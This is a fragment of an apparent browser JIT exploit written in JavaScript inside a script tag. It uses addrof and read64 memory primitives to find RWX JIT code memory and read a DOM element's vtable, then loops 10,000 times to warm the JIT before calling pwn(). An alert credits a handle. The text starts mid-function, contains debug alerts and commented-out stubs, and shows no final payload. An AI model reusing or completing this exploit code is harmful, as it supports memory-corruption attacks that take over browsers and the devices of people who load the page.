    // [0x00005eb7bfc01000-0x00005eb7ffc01000) rwx
    //

    var rwxMemAddr = primitives.read64(Add(jitCodeAddr, 24));
    print("[+] RWX memory @ " + rwxMemAddr);

    //
    // Ensure we're running on macOS by analysing the prologue
    // of the JIT function.
    //
    //primitives.write64(,0xdeadbeef0)
    //let stage1 = primitives;
        var wrapper = document.createElement("div")
        var wrapper_addr = primitives.addrof(wrapper);

        var el_addr = primitives.readInt64(wrapper_addr + 0x18)
        var vtab = primitives.readInt64(el_addr);
    alert('vtabint64'+vtab + 'vtab64' + primitives.read64(el_addr));
    
}
function init() {
    datePrototype = Object.getPrototypeOf(Date.prototype);
}

for (var k = 0; k < 10000; k++) {
    init();
    if(k == 9999) {
        alert("Credits to me @turnerhackz1 press continue");
        pwn();
    }
}
</script>
